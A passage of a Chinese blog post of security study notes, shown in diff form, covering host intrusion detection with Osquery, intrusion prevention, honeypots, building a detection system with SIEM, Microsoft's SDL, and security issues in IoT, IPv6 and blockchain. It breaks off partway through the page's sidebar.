+</ul>
+<p>对比于 NIDS，HIDS 的开发难度会高很多。主要是因为 NIDS 只需要部署在关键的网络节点上，一个公司可能也就有几百个这样的节点，而 HIDS 需要部署在公司所有的服务器中，一个公司有上万个服务器是很常见的事情。而且，我们会在日常使用中频繁改动服务器，这也使得服务器的系统环境很不统一。所以，很多公司都需要基于自己的情况自行开发 HIDS。</p>
+<p>据我了解，很多公司都会基于Osquery来开发 HIDS。Osquery 提供的信息采集功能可以满足大部分的 HIDS 需求，我们只需要运行一句简单的 SQL 语句，就能够拿到系统的关键信息了。比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过这段代码，我们可以从 Osquery 中获取到当前的全部进程信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">path</span>, pid <span class="keyword">FROM</span> processes</span><br></pre></td></tr></table></figure>
+
+<h4 id="第三种类型：IPS"><a href="#第三种类型：IPS" class="headerlink" title="第三种类型：IPS"></a>第三种类型：IPS</h4><p>在 HIDS 和 NIDS 中，我们分别通过网络行为和服务器系统行为对黑客入侵进行检测。但是，你需要注意，它们都只是检测而已。也就是说，如果你不进行人工干预的话，黑客的入侵行为并不会受到任何影响，仍然可以持续进行。精明的黑客一定会选择夜半三更的时候发起攻击，等你睡觉起来，黑客早已经拿到它们想要的数据了，而你只能看着 HIDS 和 NIDS 给出的一堆报警无可奈何。</p>
+<p>这显然不是我们希望的结果。因此，我们在 NIDS 和 HIDS 中加入了拦截的能力，就成了 NIPS 和 HIPS，统称为 IPS（Intrusion Prevention System，入侵防御系统）。IDS 和 IPS 是相辅相成的，它们唯一的区别在于，IDS 强调的是检测，IPS 强调的是拦截。当发现了黑客的攻击行为后，IDS 会产生报警，然后公司的安全响应人员会对报警进行人工处理。IPS 同样会产生报警，不过报警的同时，IPS 会尝试对黑客的行为进行拦截，在第一时间限制攻击产生的影响范围。</p>
+<p>IPS 的实现总体和 IDS 比较类似，只是 IDS 通常不会去修改网络节点和操作系统，而 IPS 会实现额外的逻辑，对网络节点和系统内的行为进行封停，从而阻止黑客入侵。</p>
+<p><img src="/images/security/security-linux/20.jpg" alt="20"></p>
+<h3 id="什么是蜜罐？"><a href="#什么是蜜罐？" class="headerlink" title="什么是蜜罐？"></a>什么是蜜罐？</h3><p>在 IDS 的检测机制中，我们主要是基于对系统行为和网络请求的分析，判断是否存在攻击行为。这种检测模式会存在两个主要的问题：第一，分析结果总会出现漏报和误判，而这些漏报和误判，不论是对用户还是对安全人员，都会造成极大的困扰；第二，分析的规则都是人工产出的，会存在滞后性。当某种新型攻击出现时，我们很可能无法及时更新 IDS 的检测规则，让 IDS 形同虚设。那么，我们应该如何提升分析的准确性呢？对于未知的攻击，我们又该如何及时发现呢？蜜罐就是一种能满足这两点需求的入侵检测工具。</p>
+<p>所谓“蜜罐”，就是一台部署在内网的服务器。这个服务器没有任何保护措施，并且提供带有漏洞的服务，就是为了吸引黑客来攻击它。蜜罐由安全人员部署在网络的各个节点中，理论上，其他开发人员都不会知道蜜罐的存在，也就不会向蜜罐发起任何请求。而黑客入侵内网后，需要对内网进行探测，如果发现蜜罐中的服务有漏洞，自然就会针对蜜罐发起攻击。因此，蜜罐内的一切行为，都是黑客产生的。基于蜜罐的报警和日志，我们就能够及时发现黑客的存在，并且还原出黑客的攻击行为。</p>
+<p>蜜罐的类型主要分为两种：低交互蜜罐和高交互蜜罐。</p>
+<p>所谓低交互蜜罐，就是蜜罐内的所有服务都是模拟的，不能提供真实的服务功能。比如，低交互蜜罐为了模拟一个弱密码的 SSH 服务，它会监听 22 端口。而黑客一旦向这个 22 端口发起 SSH 登录请求，蜜罐就会返回登录成功的响应。但是，蜜罐并没有提供真实的 SSH 服务，只是模拟了一个登录成功的响应而已，所以黑客并不能通过 SSH 连接上服务器。</p>
+<p>高交互蜜罐会提供一个真实的服务，而且不施加任何限制，只是用来做详细的记录而已。还是以上面 SSH 登录为例，在高交互蜜罐中，蜜罐会开启一个真实的 SSH 服务，黑客能够通过 SSH 连入并且控制蜜罐。但是，黑客连入蜜罐后的所有行为都会被记录下来，并产生报警。而我们只需要及时处理报警赶走黑客，就可以降低蜜罐被控制后所产生的影响。</p>
+<p>低交互蜜罐和高交互蜜罐的对比也很明显。低交互蜜罐更安全，因为它不提供真实的带有漏洞的服务，只是模拟服务，所以黑客无法控制蜜罐。但模拟的服务可能被黑客发觉，导致黑客不上钩。这个时候，高交互蜜罐对黑客更有吸引力，让我们能有更大的概率发现入侵攻击的行为。</p>
+<p>对比于 IDS，蜜罐提供了额外的入侵检测能力，它的主要优势包括：</p>
+<ul>
+<li>蜜罐几乎不会产生误报</li>
+<li>蜜罐内的所有行为都是真实的黑客攻击行为，因此数据量小、价值高</li>
+<li>不需要已知的攻击样本，根据黑客的行为我们甚至能够发现新的攻击方式</li>
+</ul>
+<p>当然，蜜罐也是有缺陷的。它的主要缺陷就是，入侵检测的实现非常依靠运气，实现的前提是必须有黑客找到蜜罐。也就是说，如果黑客进入内网后，首先发现其他带有漏洞的正常服务器，就不会进入到蜜罐中了。</p>
+<p>蜜罐的实现比较复杂，它需要恰到好处地把握提供多少的交互，既能吸引黑客，又不至于产生漏洞。好在你并不需要关心它的具体实现，因为网上已经有不少成熟的开源蜜罐了，你可以直接拿来使用。</p>
+<h3 id="如何构建入侵检测体系？"><a href="#如何构建入侵检测体系？" class="headerlink" title="如何构建入侵检测体系？"></a>如何构建入侵检测体系？</h3><p>在了解了 IDS、IPS 和蜜罐之后，我们发现这几款入侵检测工具各有其优势和不足。因此，在实际的安全防护中，我们通常会将它们组合起来使用。</p>
+<p>首先，蜜罐具备较高的准确率，并且能够发现未知的攻击。因此，我们可以将蜜罐中黑客的行为特征作为攻击样本的特征，输入到 IDS 和 IPS 中去。这样一来，IDS 和 IPS 就具备了根据黑客行为自动学习和升级的能力。</p>
+<p>其次，IPS 通常是直接拦截黑客的攻击行为，来及时止损。但这样一来，黑客也会察觉到入侵检测系统的存在。因此，我们可以将 IPS 的检测拦截行为，调整为一旦检测到攻击行为，就将行为转发到蜜罐中。对于黑客来说，攻击行为看起来仍然是成功的，但实际上不会对系统产生任何影响，且攻击行为都被记录下来了。</p>
+<p>最后，为了提升黑客发现蜜罐的概率，我们通常需要在内网中广泛地部署蜜罐。但是，这又增加了很多额外的硬件部署成本。因此，有的 HIDS 中会嵌入“微蜜罐”，就是利用服务器本身的资源实现一个小型的蜜罐服务。比如，某个部署 HIDS 的服务器中本来没有 MySQL 服务，也没有监听 3306 端口，我们可以通过设置服务器，让 HIDS 监听 3306 端口并模拟一个 MySQL 服务出来。这个 MySQL 服务是 HIDS 模拟的，开发人员不会感知到，所以发起 MySQL 连接的一定是黑客。这就是“微蜜罐”。</p>
+<p>一个系统化的入侵检测系统需要依靠各个安全产品之间的相互协作，才能够实现防护能力的最大化。下面是一个成熟的入侵检测系统的组织结构图</p>
+<p><img src="/images/security/security-linux/21.jpg" alt="21"></p>
+<p>在这个入侵检测系统中，NIDS 负责对网络节点进行检测，网络中会包含部署了 HIDS 的系统和蜜罐系统。最终，我们需要通过 ELK 来统一收集各个安全产品的检测日志，实现信息同步。所有 IDS 或者 IPS 的信息都是相互关联的，我们就能够基于这个完整的信息进行全盘的综合分析了。</p>
+<p>我们经常会使用 SIEM（Security Information and Event Management，安全信息和事件管理），来帮助我们运营一个安全体系。通过 SIEM，我们可以将散落于各个系统、设备和安全产品中的日志进行汇总和梳理，快速串联出黑客的完整攻击路径，更高效地完成安全体系运营的工作。简单来说，SIEM 就是一个基于各类日志，提供安全运营和管理能力的统一平台。</p>
+<h2 id="SDL：怎样才能写出更“安全”的代码？"><a href="#SDL：怎样才能写出更“安全”的代码？" class="headerlink" title="SDL：怎样才能写出更“安全”的代码？"></a>SDL：怎样才能写出更“安全”的代码？</h2><p>2004 年，微软提出了 SDL（Security Development Lifecycle，安全开发生命周期）。因为对安全和隐私的考虑贯穿了整个软件的开发进程，SDL 能够帮助开发人员写出更“安全”的代码，在解决安全合规需求的同时，也能减少由安全问题带来的损失。</p>
+<h3 id="SDL-中的基础概念"><a href="#SDL-中的基础概念" class="headerlink" title="SDL 中的基础概念"></a>SDL 中的基础概念</h3><p>我们先来看一个软件开发中的经典概念：软件开发生命周期 DLC（Software Development Life Cycle）（这个概念的英文缩写种类比较多，为了和 SDL 区分，我们用 DLC 代表软件开发生命周期）。SDL 是以软件开发生命周期为基础发展成的安全框架，所以，了解 DLC 能够帮助我们更好地认识 SDL。</p>
+<p>DLC 将软件开发过程分为 5 个阶段：需求分析、设计、开发、测试和部署。DLC 对5 个阶段的具体描述，都是以业务功能为核心进行展开的，并没有涵盖安全的工作。这显然不安全。</p>
+<p>而且我们都知道，安全问题对公司的威胁是客观存在的。因此，很多公司将安全纳入到测试的工作中。但是，这种做法会导致两个问题：第一，安全问题要等到软件开发完成后才能发现。这个时候，因为一个安全隐患（不是 BUG），让开发人员重启开发流程，推动上会遇到较大的阻力；第二，只能关注到最终完成的软件，往往会导致安全人员因为对业务了解不足，漏过一些安全隐患。这些问题的出现，让业内亟需一个能够更好地满足安全需求的软件开发流程，SDL 也就应运而生了。</p>
+<h3 id="什么是-SDL？"><a href="#什么是-SDL？" class="headerlink" title="什么是 SDL？"></a>什么是 SDL？</h3><p>SDL 的出现不是为了颠覆传统的 DLC 框架，而是希望在 DLC 中加入足够清晰的安全需求，以此来为软件开发的过程提供完整的安全防护。SDL 的标准执行流程有 7 个步骤：安全培训、需求分析、设计、开发、测试、部署和响应。流程如下图：</p>
+<p><img src="/images/security/security-linux/22.jpg" alt="22"></p>
+<h2 id="安全新技术：IoT、IPv6、区块链中的安全新问题"><a href="#安全新技术：IoT、IPv6、区块链中的安全新问题" class="headerlink" title="安全新技术：IoT、IPv6、区块链中的安全新问题"></a>安全新技术：IoT、IPv6、区块链中的安全新问题</h2><h3 id="独特的-IoT-安全"><a href="#独特的-IoT-安全" class="headerlink" title="独特的 IoT 安全"></a>独特的 IoT 安全</h3><p>毫无疑问，IoT（Internet of Things，物联网）是最近十年来比较火热的一个技术。对比于当前的网络环境，IoT 的网络主要有以下几个特点：</p>
+<ul>
+<li>设备更多：每一件小的物品都有可能成为联入互联网的设备</li>
+<li>设备性能更低：受限于体积和供电量，单台设备能够搭载的硬件配置都不高</li>
+<li>更加开放：由于设备的数量和类型众多，无法统一标准，因此 IoT 的 网络环境也更加开放</li>
+</ul>
+<blockquote>
+<p>那么，这些特点会给安全性带来哪些新的挑战呢？关于这个问题，我推荐你玩一玩《看门狗》这款游戏，它很好地描绘了一个未来 IoT 城市中会面临的各类安全问题。</p>
+</blockquote>
+<h4 id="认证更加复杂了"><a href="#认证更加复杂了" class="headerlink" title="认证更加复杂了"></a>认证更加复杂了</h4><p>在使用电脑或者手机连入网络的时候，我们可以手动输入密码来完成认证。但是，当我们想要将各类小硬件连入网络的时候，没有键盘和屏幕可以供我们输入密码。为了解决这个认证问题，目前小米等 IoT 厂商的解决方案是，先让手机直接控制设备，配置好 WiFI 密码后，再让设备连入网络。</p>
+<p>但是，这其实又引发了一个新的问题，如何确认是你本人在控制设备，而不是黑客呢？针对这个问题，现在也有对应的解决方案，那就是在短时间内开放设备的控制权限，限制手机在这个时间内完成对设备的控制。</p>
+<p>仔细观察的话，你会发现这个解决方案有一个假设前提：黑客没办法在短时间内发现并控制设备。在当前的环境下，这个前提是成立的。但是随着技术的发展，IoT 设备可能充斥在我们身边的每一个角落里，当有一个设备被黑客控制了之后，它很可能会时刻监控这周围的环境，一旦发现其他的设备开放控制权限，就会立即黑入。可以说，通过这样的攻击方式，任何一个设备都有可能被黑客所控制。</p>
+<p>因此，如何确保 IoT 中设备与网络、设备与设备之间的通信是可信的，是未来认证技术需要面临的主要挑战之一。其次，我认为物理攻击会越来越流行。</p>
+<p>物理攻击实际上是安全领域内的降维打击。 换句话说，当底层的硬件被黑客控制之后，我们就无法保障运行在硬件之上的系统和软件的安全性了。</p>
+<p>IoT 的发展，事实上正让物理攻击变得越来越容易。我总结了一张物理攻击的发展过程图，你可以看到，随着 IoT 越来越小、越来越智能，和我们的联系越来越紧密，物理攻击的难度也变得越来越低。在未来，公共区域内的所有设备甚至都有可以成为黑客的囊中之物。</p>
+<p><img src="/images/security/security-linux/23.jpg" alt="23"></p>
+<p>因此，如何对物理攻击进行有效的防控，也是未来安全中需要解决的主要挑战之一。</p>
+<p>目前来说，黑客利用 IoT 设备发起的最主要的攻击还是 DDoS 攻击，即黑客利用海量的 IoT 设备向目标服务器发送巨大的网络流量，导致服务器无法响应正常请求。</p>
+<p>随着 IoT 的发展，黑客能够控制的设备越来越多，能够导致的影响也会越来越大。你一定在很多电影中看到过类似的情景，比如，黑客通过操纵汽车控制医疗设备等方式，导致人员伤亡。</p>
+<p>因此，如何保护 IoT 设备免受黑客的攻击，同样会成为未来安全的主要挑战之一。</p>
+<h3 id="IPv6-对安全的影响"><a href="#IPv6-对安全的影响" class="headerlink" title="IPv6 对安全的影响"></a>IPv6 对安全的影响</h3><p>因为 IPv4 的地址空间短缺问题，IPv6 是国家重点推进的一个技术方向。目前三大运营商已经完成了改造，各大互联网公司也已经接到了兼容 IPv6 的强制要求，我相信国内应该会很快推广和普及 IPv6。</p>
+<p>IPv6 和 IPv4 相比最大区别就是 IP 地址变得非常庞大了。那么，庞大的 IP 地址对于安全来说，又意味着什么呢？</p>
+<p>我认为对于黑客来说，最大的影响就是网络扫描不再可能。</p>
+<p>我们知道，找到攻击目标是黑客发起攻击的第一步。因此，很多黑客会通过扫描网络来发现目标。目前，性能最优的扫描工具是Masscan，它能够在 5 分钟内扫遍全部 IPv4 的地址空间。</p>
+<p>而 IPv6 的地址空间是 IPv4 的 2^96 倍，黑客想要利用现有的扫描工具快速遍历 IPv6 的地址空间，显然是不可能的。因此，黑客就只能通过其他方式去精准定位目标了。除了对黑客有影响以外，庞大的 IP 地址对公司安全来说，也同样是一种负担。</p>
+<p>IP 地址变多就意味着黑客手中的 IP 资源变多了，同时，IPv6 的高变化频率还会让同一个设备的 IP 经常性的发生变化。因此，使用了 IPv6 之后，我们就很难利用黑名单对 IP 进行标记和处罚了。</p>
+<p>另外，仍然有待观察的一点是，IPv6 的复用性是否会比 IPv4 更低。</p>
+<p>IPv4 由于地址匮乏，有很高的复用性（一个学校可能都在共用一个 IP 地址），这让我们很难根据 IP 去定位到一个具体的位置或者人。</p>
+<p>而 IPv6 的地址空间是足够的（每一粒沙子都能分配到一个 IP 地址），因此，IP 复用就不再是一个刚需了。所以，如果 IPv6 的复用性远低于 IPv4 的话，就能让 IP 的定位变得更准确。那么对于安全工作来说，想要找到黑客也会更加容易。</p>
+<h3 id="区块链中的安全问题"><a href="#区块链中的安全问题" class="headerlink" title="区块链中的安全问题"></a>区块链中的安全问题</h3><p>我们都知道，区块链的思想是去中心化，即将数据和算力分散到每一个小的计算节点中，最终，以少数服从多数的形式来完成数据的计算和存储。这实际上是一种对完整性的保障。这么说你可能还不理解，我举个例子。</p>
+<p>以货币为例，我们现在通过支付宝、微信等电子货币来完成日常交易，事实上是将钱交由支付宝和微信这样的中心机构进行集中保管。而对于支付宝、微信来说，理论上是可以对用户的余额进行篡改的，不过，因为受到了多方面限制，这一操作是无法实现的。</p>
+<p>但是在比特币中，因为不存在中心机构，每个用户的余额由所有人共同保管，因此没有任何一个节点可以实现篡改。</p>
+<p>但如果你仔细想想的话，就会发现这种近乎完美的完整性保障，是通过牺牲机密性来完成的。也就是说，在支付宝中，你无法知道其他用户的余额，但是在比特币中，每一笔交易和每一个用户的余额都是公开的信息，因此比特币不提供任何针对机密性的保护措施（比如，你可以在blockchain看到所有的比特币信息）。</p>
+<p>尽管比特币本身的完整性无可挑剔，但仍然无法阻止由于用户个人密钥丢失而导致的资产损失。这就好比你安装了一个特别结实的门，但只要钥匙丢了，门的存在就毫无意义了。事实上，目前大部分的比特币安全事件，都是黑客成功盗取了用户或者公司系统的比特币密钥之后，再去盗取对应账号的余额。</p>
+<p>另外，比特币是目前黑客们主要使用的货币之一。其原因在于，它是匿名的（注意：匿名不是机密性，匿名是指你无法通过比特币的账号，关联到某个具体的人）。这也就保证了，即使警方知道了黑客的账户，也没办法抓到黑客。而且，由于比特币的去中心化，警方也没办法封停黑客的账户，追回被盗的比特币。</p>
+<p>所以，比特币这样一种去中心化且匿名的货币体系，既不保险，也不利于政府的管控，因此国内对于以区块链为基础的电子货币落地，始终不认可。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>极客时间《安全攻防技能30讲》</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/security/" rel="tag"># security</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/back-end/security/security-web/" rel="prev" title="Web 安全">
+      <i class="fa fa-chevron-left"></i> Web 安全
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/back-end/security/security-business/" rel="next" title="业务安全">
+      业务安全 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-系统安全"><span class="nav-number">1.</span> <span class="nav-text">Linux 系统安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#如何理解-Linux-中的安全模型？"><span class="nav-number">1.1.</span> <span class="nav-text">如何理解 Linux 中的安全模型？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金法则是如何在-Linux-系统中应用的？"><span class="nav-number">1.2.</span> <span class="nav-text">黄金法则是如何在 Linux 系统中应用的？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-中的认证机制"><span class="nav-number">1.2.1.</span> <span class="nav-text">Linux 中的认证机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-中的授权机制"><span class="nav-number">1.2.2.</span> <span class="nav-text">Linux 中的授权机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-中的审计机制"><span class="nav-number">1.2.3.</span> <span class="nav-text">Linux 中的审计机制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络安全"><span class="nav-number">2.</span> <span class="nav-text">网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网中的“最小权限原则”"><span class="nav-number">2.1.</span> <span class="nav-text">内网中的“最小权限原则”</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#对内网进行水平划分"><span class="nav-number">2.1.1.</span> <span class="nav-text">对内网进行水平划分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对内网进行垂直划分"><span class="nav-number">2.1.2.</span> <span class="nav-text">对内网进行垂直划分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#有线网络和无线网络安全"><span class="nav-number">2.2.</span> <span class="nav-text">有线网络和无线网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#无线网络安全"><span class="nav-number">2.2.1.</span> <span class="nav-text">无线网络安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有线网络安全"><span class="nav-number">2.2.2.</span> <span class="nav-text">有线网络安全</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何理解-DDoS-攻击？"><span class="nav-number">2.3.</span> <span class="nav-text">如何理解 DDoS 攻击？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Docker-安全"><span class="nav-number">3.</span> <span class="nav-text">Docker 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-服务安全"><span class="nav-number">3.1.</span> <span class="nav-text">Docker 服务安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-守护进程"><span class="nav-number">3.2.</span> <span class="nav-text">Docker 守护进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-镜像安全"><span class="nav-number">3.3.</span> <span class="nav-text">Docker 镜像安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用最精简的镜像"><span class="nav-number">3.3.1.</span> <span class="nav-text">使用最精简的镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Docker-中的最小权限原则"><span class="nav-number">3.3.2.</span> <span class="nav-text">Docker 中的最小权限原则</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库安全"><span class="nav-number">4.</span> <span class="nav-text">数据库安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis-安全"><span class="nav-number">4.1.</span> <span class="nav-text">Redis 安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-安全"><span class="nav-number">4.2.</span> <span class="nav-text">MySQL 安全</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分布式安全"><span class="nav-number">5.</span> <span class="nav-text">分布式安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#针对-Hadoop-的攻击方式有哪些？"><span class="nav-number">5.1.</span> <span class="nav-text">针对 Hadoop 的攻击方式有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hadoop-自带的安全功能有哪些？"><span class="nav-number">5.2.</span> <span class="nav-text">Hadoop 自带的安全功能有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黄金法则在-Hadoop-上如何应用？"><span class="nav-number">5.3.</span> <span class="nav-text">黄金法则在 Hadoop 上如何应用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hadoop-中有哪些加密形式？"><span class="nav-number">5.4.</span> <span class="nav-text">Hadoop 中有哪些加密形式？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过-Hadoop-安全框架来加强安全功能"><span class="nav-number">5.5.</span> <span class="nav-text">通过 Hadoop 安全框架来加强安全功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙"><span class="nav-number">6.</span> <span class="nav-text">防火墙</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防火墙如何为网络提供保护？"><span class="nav-number">6.1.</span> <span class="nav-text">防火墙如何为网络提供保护？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#包过滤防火墙"><span class="nav-number">6.1.1.</span> <span class="nav-text">包过滤防火墙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#应用网关防火墙"><span class="nav-number">6.1.2.</span> <span class="nav-text">应用网关防火墙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#状态检测防火墙"><span class="nav-number">6.1.3.</span> <span class="nav-text">状态检测防火墙</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防火墙可以为网络边界提供哪些保护呢？"><span class="nav-number">6.2.</span> <span class="nav-text">防火墙可以为网络边界提供哪些保护呢？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#保护操作系统的漏洞"><span class="nav-number">6.2.1.</span> <span class="nav-text">保护操作系统的漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#阻止非法的信息流动"><span class="nav-number">6.2.2.</span> <span class="nav-text">阻止非法的信息流动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#限制可访问的服务和审计"><span class="nav-number">6.2.3.</span> <span class="nav-text">限制可访问的服务和审计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防火墙有哪些防御盲区？"><span class="nav-number">6.3.</span> <span class="nav-text">防火墙有哪些防御盲区？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF：如何为漏洞百出的Web应用保驾护航？"><span class="nav-number">7.</span> <span class="nav-text">WAF：如何为漏洞百出的Web应用保驾护航？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF-的工作模式"><span class="nav-number">7.1.</span> <span class="nav-text">WAF 的工作模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF-的功能"><span class="nav-number">7.2.</span> <span class="nav-text">WAF 的功能</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-解析能力"><span class="nav-number">7.2.1.</span> <span class="nav-text">HTTP 解析能力</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web-安全防护"><span class="nav-number">7.2.2.</span> <span class="nav-text">Web 安全防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#审计告警"><span class="nav-number">7.2.3.</span> <span class="nav-text">审计告警</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据保护和虚拟补丁"><span class="nav-number">7.2.4.</span> <span class="nav-text">数据保护和虚拟补丁</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDS：当黑客绕过了防火墙，你该如何发现？"><span class="nav-number">8.</span> <span class="nav-text">IDS：当黑客绕过了防火墙，你该如何发现？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是-IDS？"><span class="nav-number">8.1.</span> <span class="nav-text">什么是 IDS？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一种类型：NIDS"><span class="nav-number">8.1.1.</span> <span class="nav-text">第一种类型：NIDS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二种类型：HIDS"><span class="nav-number">8.1.2.</span> <span class="nav-text">第二种类型：HIDS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三种类型：IPS"><span class="nav-number">8.1.3.</span> <span class="nav-text">第三种类型：IPS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是蜜罐？"><span class="nav-number">8.2.</span> <span class="nav-text">什么是蜜罐？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何构建入侵检测体系？"><span class="nav-number">8.3.</span> <span class="nav-text">如何构建入侵检测体系？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SDL：怎样才能写出更“安全”的代码？"><span class="nav-number">9.</span> <span class="nav-text">SDL：怎样才能写出更“安全”的代码？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SDL-中的基础概念"><span class="nav-number">9.1.</span> <span class="nav-text">SDL 中的基础概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是-SDL？"><span class="nav-number">9.2.</span> <span class="nav-text">什么是 SDL？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全新技术：IoT、IPv6、区块链中的安全新问题"><span class="nav-number">10.</span> <span class="nav-text">安全新技术：IoT、IPv6、区块链中的安全新问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#独特的-IoT-安全"><span class="nav-number">10.1.</span> <span class="nav-text">独特的 IoT 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#认证更加复杂了"><span class="nav-number">10.1.1.</span> <span class="nav-text">认证更加复杂了</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPv6-对安全的影响"><span class="nav-number">10.2.</span> <span class="nav-text">IPv6 对安全的影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#区块链中的安全问题"><span class="nav-number">10.3.</span> <span class="nav-text">区块链中的安全问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Richard"
+      src="https://avatars3.githubusercontent.com/u/18113256?v=3&s=460">
+  <p class="site-author-name" itemprop="name">Richard</p>
+  <div class="site-description" itemprop="description">惶者生存，偏执者成功</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">132</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
